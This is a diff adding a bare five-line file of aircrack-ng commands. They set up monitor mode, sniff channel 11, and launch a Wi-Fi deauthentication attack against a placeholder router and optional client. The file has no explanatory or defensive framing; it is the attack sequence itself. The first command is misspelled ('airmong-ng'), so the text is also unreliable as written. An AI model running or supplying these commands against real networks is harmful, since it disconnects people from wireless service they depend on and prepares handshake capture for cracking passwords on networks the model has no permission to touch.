@@ -1,0 +1,5 @@
+airmong-ng start wlan1
+
+airodump-ng -c 11 wlan1
+
+aireplay-ng -0 10 -a ROUTER -c OPTIONAL_CLIENT
